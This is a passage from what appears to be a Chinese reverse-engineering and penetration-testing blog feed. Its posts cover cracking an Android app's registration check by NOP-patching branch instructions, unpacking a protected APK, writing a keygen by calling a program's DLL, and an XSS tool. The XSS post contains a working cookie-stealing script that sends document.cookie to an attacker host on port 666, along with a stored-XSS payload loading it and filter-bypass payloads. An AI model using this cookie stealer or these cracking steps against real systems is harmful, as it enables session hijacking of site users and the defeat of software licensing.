<p>很直观，和流程图中的差不多，前面几个是if语句，可能在操作一些加密之类的东西，不是很重要，但是我们发现最后返回的是根据V8和V0进行判断的，在java层我们也分析道我们要的就是返回值，看最后的循环语句，可以清楚的发现，其实就是就是一个类似于strcmp的一个函数，每一个字符进行比较，如果有一处不一样，就跳出循环，否则都一样的话呢，返回v8，这个是1，这下就好看了，我们有两种方法，获取到v5的值，这个就是注册码，或者是将这个返回修改一下也是可以的。</p>
<ol>
<li><p>获取注册码：<br>我们在这个循环判断之前下断：<br><img src="img8.jpg" alt="循环判断"><br>发现其实就是每次取出一个字符，然后进行判断，这个R2中的或者R0中的就是我们的注册码，动态调试一下：<br><img src="img9.jpg" alt="R2"><br>这个不是我们输入的，我输入的是123，这个不一样，所以基本可以判定是注册码，发现真是！</p>
</li>
<li><p>修改跳转<br><img src="img10.jpg" alt="流程"><br>第一个BNE的跳转发现，如果满足，就回到下面的一个分支，而不满足就到另外一个分支，而下面的分支中又有一个BNE，这个BNE会往上进行跳转，这个是不是就是很容易理解了，所以这个就是我们while循环，并且进一步分析，发现我们第一个BNE的不进入循环的分支就是返回，也就是返回假，而进入循环一直循环的结束分支也就是左边的那个，应该就是返回真的，所以我们在so层的话呢，我们最好的办法就是直接将这两个BNE给NOP掉，这样子的话呢我们就可以顺序执行，最终只循环一次就可以实现返回真！</p>
</li>
</ol>
<p>我们将第一个BNE：05 00 00 1A修改为00 00 00 00<br>我们将第一个BNE：F6 FF FF 1A修改为00 00 00 00</p>
<p>尝试修改编译之后发现，确实是实现了！</p>
<p>并且其实在java层的修改其实也是可以实现我们的一个程序破解的！</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android脱壳</title>
    <url>/2020/03/28/Android%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<h1 id="Android脱壳"><a href="#Android脱壳" class="headerlink" title="Android脱壳"></a>Android脱壳</h1><p>比较简单的示例，拖一个阿里的壳，从别的地方学习借鉴到的。<a href="https://blog.csdn.net/coc_k/article/details/51985976" target="_blank" rel="noopener" title="传送门">https://blog.csdn.net/coc_k/article/details/51985976</a><br>首先脱壳Android Killer，发现是阿里的壳。<br><img src="img1.jpg" alt="壳"><br>看一下入口类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android:name&#x3D;&quot;com.ali.mobisecenhance.StubApplication&quot;</span><br></pre></td></tr></table></figure>
<p>明显是加壳了，而且文件结构中只有一个类，典型的加固，使用IDA进行脱壳。</p>
<p>使用调试模式打开APP，使用到的命令：<br>adb shell am start -D -n com.ali.tg.testapp/.MainActivity</p>
<p><img src="img2.jpg" alt="调试模式"><br>等待我们的调试进程进行附加</p>
<p>我们使用IDA附加进程。来到：/system/lib/libdvm.so 这个库文件中，在导出函数：dvmDexFileOpenPartial的开始位置下断：</p>
<p><img src="img3.jpg" alt="特定函数下断"></p>
<p>下好断点之后，连接调试进程：jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700</p>
<p>输入这条命令之后，JDB就会在等待IDA运行，运行之后JDB就输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\a&gt;jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;localhost,port&#x3D;8700</span><br><span class="line">设置未捕获的java.lang.Throwable</span><br><span class="line">设置延迟的未捕获的java.lang.Throwable</span><br><span class="line">正在初始化jdb...</span><br></pre></td></tr></table></figure>
<p>这个可能失败，要注意看看DDMS怎么个情况。<br>然后我们程序就会断在：</p>
<p><img src="img4.jpg" alt="断下"><br>我们是在dvmDexFileOpenPartial这个函数断下的，所以我们的第一个参数是dex文件的起始地址，第二个参数是dex文件的长度。第一个参数的值存在R0，第二个参数的值存在R1。我们转到R0看一下：<br><img src="img5.jpg" alt="R0寄存器"><br>可以看到起始地址就是我们想要要的，然后使用脱壳脚本进行脱壳，R0:0x4E472008，R1:0x941FC</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">    fp = fopen(<span class="string">"d:\\dump.dex"</span>, <span class="string">"wb"</span>); <span class="comment">//打开或创建一个文件</span></span><br><span class="line">    begin =  <span class="number">0x4E472008</span>;              <span class="comment">//dex基址</span></span><br><span class="line">    end = begin + <span class="number">0x941fc</span>;            <span class="comment">//dex基址 + dex文件大小</span></span><br><span class="line">    <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end;dexbyte ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        fputc(Byte(dexbyte), fp);     <span class="comment">//按字节将其dump到本地文件中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行这个脚本，会在D盘下生成一个dex文件。<br><img src="img6.jpg" alt="运行脚本"><br>然后我们将脱掉的dex反编译。<br><img src="img7.jpg" alt="反编译dex"><br>最后得到smali文件：<br><img src="img8.jpg" alt="生成文件"><br>然后我们将这两个文件拖进Android Killer的。<br><img src="img9.jpg" alt="复制"><br><img src="img10.jpg" alt="新文件"><br>然后我们将我们的入口APP类删除掉，最后就是剩下我们脱掉壳的程序了。<br><img src="img11.jpg" alt="删除入口类"><br>然后我们进行编译！最终就会生成脱壳之后的apk文件。<br>能够正常运行。<br><img src="img12.jpg" alt="脱壳成功"></p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Wker_XSSTool</title>
    <url>/2020/03/28/Wker-XSSTool/</url>
    <content><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>这种漏洞相对于其他为例比较大的漏洞来说可能稍显鸡肋了，但是在有的时候却是一种没有办法的办法</p>
<p>相关的检测和利用工具之前说要做，但是一直拖着，昨天有点时间，写了一下午就匆匆写完，有一些细节方面处理的不是很仔细，但是个人感觉使用起来还是没什么问题的。</p>
<h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>这种是可以进行工具检测的，相对而言可以减少很多的体力活，在这里我使用XSS挑戰賽給大家做為一個示例，这个挑战赛分为很多关卡，举出一两个比较有代表性的作为例子。<br>目前我只做了GET提交方式的，POST提交的暂时没有去做，但是很快也会补上的。<br><img src="img1.jpg" alt="第二关"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="actionscript">confirm(<span class="string">"完成的不错！"</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">"level3.php?writing=wait"</span>; </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">"border:0px"</span> <span class="attr">type</span>=<span class="string">"text/x-scriptlet"</span> <span class="attr">data</span>=<span class="string">"http://xss.tv/themes/default/templates/head.html"</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"搜索"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:4<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>基本可以确定两个变量输出的位置，根据简单的闭合操作就可以实现弹窗，那么工具如何使用？<br>首先看一下目录结构：<br><img src="img2.jpg" alt="目录结构"></p>
<ol>
<li>js目录是用来保存我们的木马js的</li>
<li>plugins是用来保存我们的插件的（后面有讲如何编写插件）</li>
<li>PayLoad是用来保存我们的payload的</li>
</ol>
<p>知道这些以后，我们就使用工具进行检测，进入界面之后，在我们的文本框中键入我们需要检测的URL，这里是第一个需要之后修复的细节，就是我只是简单的做了文本的拼接，所以我们需要将可疑的参数放置在最后，并且无对应的键值。<br><img src="img3.jpg" alt="检测界面"><br>这个时候我们就要进行检测，点击右边的Button，开始检测，可以来看下效果：<br><img src="img4.jpg" alt="检测结果"><br>可以看到提供给我们四个payload，那这四个payload到底是如何得到的呢？<br>首先在Payload.txt文件夹中存在：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/wker/</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>这些payload是可以自己添加的。<br>这样子的一条检测语句，那为什么会出现四个呢？其实很简单，我们仔细观察源代码，你会发现，在第二关存在两个输出我们传入变量的HTML节点：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这两条，如果我们手动去检测的话呢，第一个需要关注的就是这两个存在输出位置的HTML节点，所以我增加payload的修饰功能，也就是可以帮助你自动的闭合标签，比较智能化的去检测页面的XSS。<br>那每一个输出点的第二条是什么，又是怎么来的？这个是由插件所提供的功能，其实这里说的插件就是我们自己编写的DLL。现在看这个XSS挑战赛的第六关：<br><img src="img5.jpg" alt="第六关"><br>这一关对我们的输入是做了一些检测的，也就是对script进行了一个替换，但是他无法对付大小写的一个绕过，那这个时候使用工具进行检测：<br><img src="img6.jpg" alt="检测结果"><br>可以看到我们只存在一条了，那另一条哪里去了？其实是因为script的过滤导致我们无法进行注入，但是我嗯是用大小写绕过之后确实可以进行注入的，那么为什么可以进行大小写的替换，就是因为我们的插件，来到plugins的目录下，可以看到：<br><img src="img7.jpg" alt="插件"><br>这样子的一个DLL文件，那么这个DLL文件是如何实现对我们Payload的一个修饰呢？我们查看他的导出函数：<br><img src="img8.jpg" alt="导出函数"><br>可以看到他有一个导出函数，也就是程序通过调用这个导出函数实现我们的payload修饰。<br>来看下是怎么书写的：<br><img src="img9.jpg" alt="EncodePayload"><br>我会对整个plugins进行一个遍历，对所有的<code>EncodePayload</code>函数的值进行一个保存，在我们进行检测的时候我会调用相对的方法去修饰我们的payload，传给你三个参数，第一个参数是要修饰的payload，第二个参数是用来接收的payload，第三个参数是认为如果存在漏洞，页面中应该存在的文本内容。<br>这个函数最终实现的就是一个script转化为SCRIPT的效果，所以我们能够成功的绕过第六关的一个检测。<br>那么如果你想编写自己的插件的话呢，那么你需要在头文件中键入类似于如下的内容：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXAMPLEDLL_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXAMPLEDLL_API extern<span class="meta-string">"C"</span> __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXAMPLEDLL_API extern<span class="meta-string">"C"</span> __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXAMPLEDLL_API <span class="keyword">int</span> <span class="title">EncodePayload</span><span class="params">(<span class="keyword">char</span>* SourcePayload,<span class="keyword">char</span>* EncodePayload,<span class="keyword">char</span>* FindPayload)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>extern&quot;C&quot;</code>是很重要的，这个保证了我可以通过EncodePayload来获得你的地址，<code>__declspec(dllexport)</code>这个保证了导出函数。</p>
<h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>那么我们就来实践编写一个插件，来到第七关，这一关就是对我们的script进行一个替换，那么，我们只需要对其简单地进行嵌套就可以实现绕过，那么我们编写插件的思路就是，将payload中的<code>script</code>替换为<code>scrscriptipt</code>就可以实现绕过，那么我们新建一个DLL项目，然后使用上面的宏定义。<br>然后编写我们的<code>EncodePayload</code>方法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EncodePayload</span><span class="params">(<span class="keyword">char</span>* SourcePayload,<span class="keyword">char</span>* EncodePayload,<span class="keyword">char</span>* FindPayload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CString source;</span><br><span class="line">	source.Format(<span class="string">"%s"</span>,SourcePayload);</span><br><span class="line">	source.Replace(<span class="string">"script"</span>,<span class="string">"scrscriptipt"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(FindPayload,SourcePayload);</span><br><span class="line">	<span class="built_in">strcpy</span>(EncodePayload,source.GetBuffer());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我这里用了一个Cstring进行了一个中专，比较简单，如果要操作char的话呢有一点小麻烦，其实可以看到也就是简单的文本替换，只是我们要寻找的文本还是我们之前的那个文本！<br>最后看下我们实现的一个效果：<br><img src="img10.jpg" alt="自写插件"><br>可以看到我们确实是检测出了那个我们想要的效果！</p>
<p>对外提供了接口之后，你们可以实现base64加密啊这类的一些加密和绕过。</p>
<p>但是在这里需要注意的一点就是我传给你的指针是我已经new了的，但是大小是50个长度，所以你生成的payload不要超过50个字符！否则会溢出的。</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>这个就比较实用了，经常用到，之前我都是用XSS平台，但是它里面提供的功能总是很多不能用，而且我觉得他那边也能看到我们打到的cookie，所以我就不是很喜欢，所以我就自己做了一个服务端，也提供给大家使用，后期也提供接口开发，只要你的服务器是对外网开放666端口的就是可以进行连接！<br>BEEF相对而言迁移有点麻烦，所以我就在检测端写了相对应的存储型XSS服务。<br>下面给大家做一个示例：<br>搭建一个简单的靶场，就是用来测试的，存在一个存储型的XSS：<br><img src="img11.jpg" alt="提交留言"><br>在留言内容中提交我们的payload，那这个payload怎么写呢？我们用Wker_XSSTool的第二个页面，勾选上开始劫持，勾选上之后如果不报错没并且有这样的一个提示，说明服务器开启正常，当然你的防火墙是需要给我开房666端口的。<br><img src="img12.jpg" alt="开启端口"><br>看到详细信息中心给了我们这样子的一段内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请使用类似于:&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;127.0.0.1:666&#x2F;WkerJS&gt;&lt;&#x2F;sCrIpT&gt; 这样的PayLoad，只有这样Wker_XSSTool才能接收到劫持的信息！</span><br></pre></td></tr></table></figure>
<p>就是说你将你的IP的666端口下的WkerJS作为SRC进行注入Wker_XSSTool就可以进行接受，那么我们的JS到地方再哪里？我们如何配置？<br>在上面的目录结构到js目录下有个Main.js这个文件，我们看一下他的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">//var xhr = new ActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line">xhr.open(<span class="string">"HEAD"</span>, <span class="string">"http://192.168.209.1:666/"</span>+<span class="built_in">window</span>.location.href+<span class="string">"|--|"</span>+<span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到就是一个简单的数据提交，这里你需要更改这个192.168.209.1，将其改为你服务器的IP，因为只有这样我们才能获取。<br>payload的构造其实不是很难：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">tExtArEa</span>&gt;</span>'"&gt;<span class="tag">&lt;<span class="name">sCRiPt</span> <span class="attr">sRC</span>=<span class="string">http://192.168.209.1:666/WkerJS</span>&gt;</span><span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="img13.jpg" alt="提交Payload"><br>提交之后，当我们的管理员打开我们提交的页面之后，我们的服务端就能接受到他的cookie！<br>下面是示例：<br><img src="img14.gif" alt="成功"><br>可以看到我们成功的获取到了管理员的信息！</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>之后我会更新这个程序的，主要是增加许多相对应的功能，因为细节方面没有做的很完美，最近主要是想把我之前做的那个Wker_EXEDebug这个调试工具写的完美一些，不能说跟得上OD，IDA和X64，但是至少也要做到许多他们有的我也要有的功能。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>偷so间接解密</title>
    <url>/2020/03/25/%E5%81%B7so%E9%97%B4%E6%8E%A5%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h1 id="间接解密"><a href="#间接解密" class="headerlink" title="间接解密"></a>间接解密</h1><p>分析数据加密的过程中，很多情况下我们是会碰到难以复现的情况（例如混淆和函数套用），不管是Windows下还是Linux下都是比较难搞的，但是我们有的时候可以通过一些特殊的手段进行数据的解密。<br>下面我会有钱入深的给大家介绍如何进行间接解密。</p>
<h2 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h2><p>从简单的开始，所以我就先用Windows下的win32程序进行一个剖析。</p>
<h3 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h3><p>简单的写一个注册码的小程序，我们就是要来偷取他的算法。<br><img src="img1.jpg" alt="验证程序"><br>就是输入用户名和激活码来判断是否是我们的用户，我们用OD附加（用我写的那个Wker_EXEDebug也可以），然后搜索一下错误字符串，然后我进入这个验证函数。<br><img src="img2.jpg" alt="错误验证"><br>我们进入这个函数，看一下附近的代码：<br><img src="img3.jpg" alt="关键跳"><br>看到这个跳转之后，我们往上看，在我们的程序入口下断，然后输入错误密码，往下跟，注意寄存器的值，观察我们输入的内容被压入堆栈之后：<br><img src="img4.jpg" alt="加密函数"><br>可以看到这个按道理来说就是我们的加密函数，所以我们跟进去，可以观察到我们进入了Dll.dll程序的领空，我们记下函数的入口地址：0xFEF1000，然后观察这个模块的基地址：0xFEF0000<br><img src="img5.jpg" alt="函数地址"><br><img src="img6.jpg" alt="DLL模块地址"></p>
<p><em>计算出相对的偏移地址：0x1000，注意是十六进制。</em></p>
<p>我们简单的分析一下，这个程序是通过加载其他的DLL执行相对应的加密函数来得到加密的字符串，所以我们的思路来了，我们调用他的加密函数，来写一个简单的注册机。<br>在这之前我们还需要分析一下函数的一个定义。<br>函数进入的时候堆栈只压了一个参数，并且是一个四字节的参数，并且是一个字符地址，并且使用的是ASCII码的编码方式，所以极大概率是char*的一个指针，参数我们确定了接下来我们就需要来确定函数的调用约定，来到返回值部分：<br><img src="img7.jpg" alt="返回类型"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0FEF103E  |.  5B            pop ebx                                               ;  DLLencod.00CB1827</span><br><span class="line">0FEF103F  |&gt;  5F            pop edi                                               ;  DLLencod.00CB1827</span><br><span class="line">0FEF1040  |.  C60430 00     mov byte ptr ds:[eax+esi],0x0</span><br><span class="line">0FEF1044  |.  5E            pop esi                                               ;  DLLencod.00CB1827</span><br><span class="line">0FEF1045  |.  5D            pop ebp                                               ;  DLLencod.00CB1827</span><br><span class="line">0FEF1046  \.  C3            retn</span><br></pre></td></tr></table></figure>

<p>可以看到是我们外部进行的堆栈清理操作，并且我们跳出函数来看他是如何清理堆栈的：<br><img src="img8.jpg" alt="清理堆栈"><br>可以看到是通过增加ESP的值来实现堆栈平衡的，所以基本上可以确定是使用的C++编写的函数，并且函数是使用的<code>__cdecl</code>的调用约定，而并Windows的<code>__stdcall</code>调用约定。<br>知道这些之后，我们就可以来通过实践来偷取他的加密函数。<br>最终我们可以得出函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span>  <span class="keyword">char</span>*(__cdecl *lpencodefun)(<span class="keyword">char</span>*);</span><br></pre></td></tr></table></figure>

<h3 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h3><p>既然我们知道函数地址是相对模块基地址的0X1000的偏移位置的，并且我们也判断了对应的函数调用方式，所以接下来的操作，就很简单了，我们脱出他的DLL，给我们自己用，传入我们想要注册的用户名，最终得到我们的注册码，实现代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">typedef</span>  <span class="keyword">char</span>*(__cdecl *lpencodefun)(<span class="keyword">char</span>*);</span><br><span class="line">	</span><br><span class="line">	DWORD h = (DWORD)LoadLibrary(<span class="string">"Dll.dll"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%x\n"</span>,h+<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">	lpencodefun encode = (lpencodefun)(h+<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,encode(<span class="string">"abc"</span>));</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们放上我们的函数定义（<code>__cdecl</code>默认可以不加），然后加载注册程序的DLL，最终加上我们的偏移量：0x1000，得到真正的加密函数，最后注册成功：<br><img src="img9.jpg" alt="注册成功"></p>
<p>这种是根据DLL进行间接加密，其实即使他不用DLL，我们一样可以，远程调用函数就好，就和我们平常写外挂用到的CALL一样的，无非最后我们截取他的eax值就可以了（前面推断出他是C++写的），其实这种方式最好是用DLL注入配合上DbgView是最好的，HOOK的话呢有点本末倒置了，与我下面的思想有点冲突了，所以我就不举例了。<br><img src="img10.jpg" alt="返回值"></p>
<h2 id="Android偷取加密算法"><a href="#Android偷取加密算法" class="headerlink" title="Android偷取加密算法"></a>Android偷取加密算法</h2><p>其实说是Android下的，但是一般下我们需要进入到so层进行加密算法的窃取，我用一个实例去讲解我上面所写到的思想：</p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>前两天做安卓的爬虫，去分析加密的时候一个实例，APP是一个读小说的程序<br>我们使用FD去抓包（Charles不是很方便抓这些），抓到的包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">as&#x3D;ab9aacee485e79df9e9aac&amp;mas&#x3D;01999323139999f9b9b9a379b945a1c446f9b9b9a399a35919a3d3</span><br></pre></td></tr></table></figure>
<p>这个只是封包的一部分，为了不增加文章的难度，其他的数据就不列出了，使用反编译APP去分析他，最后在重重翻找之下，终于找到了对应的java层的代码，很是让人兴奋：<br><img src="img11.jpg" alt="关键代码段"><br>java层的分析还是相对而言简单一些的，所以我们往上看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">v15_2 = v6.a();</span><br><span class="line">v0_5 = AppLog.l();</span><br><span class="line">String v14_2 = !m.a(v0_5) ? UserInfo.getUserInfo(v5_1, v15_2, v14_1, v0_5) : UserInfo.getUserInfo(v5_1, v15_2, v14_1, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span>(!TextUtils.isEmpty(((CharSequence)v14_2))) &#123;</span><br><span class="line">    <span class="keyword">int</span> v15_3 = v14_2.length();</span><br><span class="line">    <span class="keyword">if</span>(v15_3 % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        v14_2 = v14_2.substring(<span class="number">0</span>, v15_3 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">this</span>.h = StcSDKFactory.getSDK(<span class="keyword">this</span>.d, <span class="keyword">this</span>.c);</span><br><span class="line">        <span class="keyword">this</span>.h.SetRegionType(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">this</span>.e) &#123;</span><br><span class="line">            v15_2 = AppLog.h();</span><br><span class="line">            <span class="keyword">if</span>(!TextUtils.isEmpty(((CharSequence)v0_5)) &amp;&amp; !TextUtils.isEmpty(((CharSequence)v15_2))) &#123;</span><br><span class="line">                <span class="keyword">this</span>.h.setParams(v0_5, v15_2);</span><br><span class="line">                <span class="keyword">this</span>.e = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.h.setSession(a.a());</span><br><span class="line">        v15_2 = d.a(<span class="keyword">this</span>.h.encode(v14_2.getBytes()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        v14_2 = <span class="string">"a1qwert123"</span>;</span><br><span class="line">        v15_2 = <span class="string">"123"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    v14_2 = <span class="string">"a1iosdfgh"</span>;</span><br><span class="line">    v15_2 = <span class="string">"123"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v6.a(<span class="string">"as"</span>, v14_2);</span><br><span class="line">v6.a(<span class="string">"mas"</span>, v15_2);</span><br></pre></td></tr></table></figure>
<p>可以分析到，我们的mas和as是通过上面的v14_2和v15_2所赋值的，再往上看，可以看到一大堆的分支，有个分支是等于一个指定的字符串，这显然不是我们想要的，所以最终我们可以确定为我们的mas的计算算法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">v15_2 = d.a(<span class="keyword">this</span>.h.encode(v14_2.getBytes()));</span><br></pre></td></tr></table></figure>
<p>这个时候发现我们的mas是通过as计算出来的，在这里我们不进行as的计算，否则文章会实在太长了（算法很复杂），这里只进行mas的计算。<br>mas是通过d.a这个方法进行计算的，虽然混淆很严重，但是分析起来还不是很烦，跟进这个a方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    d.a = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 